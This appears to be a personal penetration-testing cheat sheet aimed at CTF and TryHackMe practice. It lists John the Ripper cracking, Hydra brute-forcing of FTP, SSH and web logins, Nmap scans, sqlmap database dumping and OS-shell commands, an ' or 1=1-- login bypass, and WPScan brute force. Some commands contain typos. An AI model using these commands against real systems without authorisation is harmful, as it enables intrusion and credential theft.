# Gray-hat-Pratical

John 

Single crack mode: john --single --format=raw-sha1 crack.txt
Crack the password in file using wordlist: john --wordlist=/usr/share/john/password.lst --format=raw-sha1 crack.txt (Crack.txt here contains the hashes)

Cracking service credentials like ssh

1. First have to convert the hash file to JOHN format : ssh2john /home/text/.ssh/id_rsa > crack.txt (Now we need to crack this crack.txt file with John The Ripper)
2. john --wordlist=/usr/share/wordlists/rockyou.txt crack.txt

To crack ZIP

1. zip2john file.zip > crack.txt
2. john --wordlist=/usr/share/wordlists/rockyou.txt crack.txt



Notes:
–wordlist can be written as -w also

john crack.txt --wordlist=rockyou.txt --format=Raw-SHA256

---------------------------------------------------------------------------------------------------------------

Hydra

FOR FTP

If username is already given : hydra -l nonanik -P -P /usr/share/wordlists/rockyou.txt 192.168.1.101 ftp

If password is given and needs to find username = hydra -L user.txt -p 123 192.168.1.101 ftp

If both username and password is not given : hydra -L user.txt -P /usr/share/wordlists/rockyou.txt 192.168.1.101 ftp

Reference : https://www.hackingarticles.in/comprehensive-guide-on-hydra-a-brute-forcing-tool/

FOR SSH

hydra -L /usr/share/wordlists.rockyou.txt -P /usr/share/wordlists/rockyou.txt 192.168.1.101 -t 4 ssh

FOR HTTP FORM

hydra -L [user] -P [password] [IP] http-post-form "/:usernam=^USER^ & password=^PASS^:F=incorrect" -V

--------------------------------------------------------------------------------------------------------

Nmap

nmap -sV -sC -oA nmap.txt 10.10.10.x
nmap -sC -sV -v -oN nmap.txt 10.10.10.x
nmap -sS -P0 -A -v 10.10.10.x
masscan -e tun0 -pi-65535 --rate=1000
nmap -sU -sV -A -T4 -v -oN udp.txt 10.10.10.x

---------------------------------------------------------------------------------------------------------------------------
SQL MAP

URL = http://testphp.vulnweb.com/artists.php?artist=1

Find DBs = sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --dbs --batch

Result is DB name acuart

Find Tables = sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart --table --batch

Result is table name users

Find columns = sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart -T users --columns --batch

Dump table = sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart -T users --dump --batch

Dump the DB = sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart --dump-all --batch



Reference = https://www.hackingarticles.in/database-penetration-testing-using-sqlmap-part-1/

Using cookies
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --cookie='JSESSIONID=09h76qoWC559GH1K7DSQHx' --random-agent --level=1 --risk=3 --dbs --batch

SQL Injection

in login page enter blah' or 1=1-- as username and click login without entering the password

OS Shell = sqlmap -u 'url' --dbms=mysql --os-shell
SQL Shell = sqlmap -u 'url' --dbms=mysql --sql-shell

---------------------------------------------------------------------------------------------------------------------------
TRY HACK ME ROOM 

Tools:-
https://lnkd.in/gvExZAk
https://lnkd.in/gFd7C-c
https://lnkd.in/guZsBtX
https://lnkd.in/gQDithi
https://lnkd.in/gSaZTcF
https://lnkd.in/gRFivzZ
https://lnkd.in/gnBZ8N2
https://lnkd.in/gXH5qDX
https://lnkd.in/g7x59qP

Challenge rooms:-
https://lnkd.in/gFYnaTz

(P.S Some of the rooms mentioned are available only in Pro account)

---------------------------------------------------------------------------------------------------------------------------

WPSCAN

User Enumeration : wpscan --url https://example/ --enumerate u
Bruteforce: wpscan --url https://example/ --passwords wordlist.txt --usernames nonanik


----------------------------------------------------------------------------------------------------------------------------

Wireshark

To find DOS (SYN and ACK) : tcp.flags.syn == 1  , tcp.flags.syn == 1 and tcp.flags.ack == 0
To find passwords : http.request.method == POST
More reference: https://www.comparitech.com/net-admin/wireshark-cheat-sheet/

To find DOS: Look for Red and Black packets with around 1-2 simple packets in between and then pick any packet and check the Source and Destination IP with port(As per question)

